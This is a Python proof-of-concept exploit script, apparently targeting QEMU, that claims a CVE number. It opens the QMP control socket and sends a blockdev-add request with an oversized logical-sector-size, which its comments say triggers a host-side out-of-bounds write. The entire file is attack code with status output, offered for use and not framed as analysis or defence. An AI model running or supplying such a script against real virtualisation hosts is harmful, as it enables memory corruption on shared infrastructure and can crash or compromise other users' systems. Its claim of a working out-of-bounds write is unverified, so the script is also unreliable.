#!/usr/bin/env python3
#
# PoC for QEMU block driver OOB via malformed blockdev-add
# CVE-2014-8170
#
# Connects to QMP and adds a raw block device with an excessively large
# logical‐sector‐size, causing a host‐side OOB write.

import socket, json, time

QMP_SOCKET = "/tmp/qemu-qmp-sock"

def qmp_cmd(sock, cmd):
    sock.sendall((json.dumps(cmd) + "\n").encode())
    return json.loads(sock.recv(4096).decode())

if __name__ == "__main__":
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(QMP_SOCKET)
    print("[+] Connected to QEMU QMP")

    qmp_cmd(s, {"execute": "qmp_capabilities"})
    print("[+] Negotiated QMP capabilities")

    cmd = {
        "execute": "blockdev-add",
        "arguments": {
            "driver": "raw",
            "node-name": "badblk",
            "filename": "/dev/zero",
            "logical-sector-size": 0xFFFFFFFF,  # oversized
            "cache": "none"
        }
    }
    resp = qmp_cmd(s, cmd)
    print("[+] Sent blockdev-add:", resp)

    time.sleep(2)
    print("[!] Check QEMU for OOB corruption")
    s.close()